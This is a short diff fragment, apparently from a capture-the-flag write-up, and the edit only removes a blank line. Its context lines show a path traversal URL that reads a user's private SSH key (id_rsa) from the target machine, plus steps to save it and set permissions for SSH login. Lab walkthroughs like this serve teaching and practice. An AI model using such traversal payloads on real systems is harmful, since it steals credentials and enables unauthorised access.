@@ -39,7 +39,6 @@ out of those 3 users we can get gloria's id_rsa to connect via ssh
 http://machineip:5555/?page=../../../../../../../../home/gloria/.ssh/id_rsa
 
 save it to a file
-
 ```
 ```	
 chmod 400 id_rsa
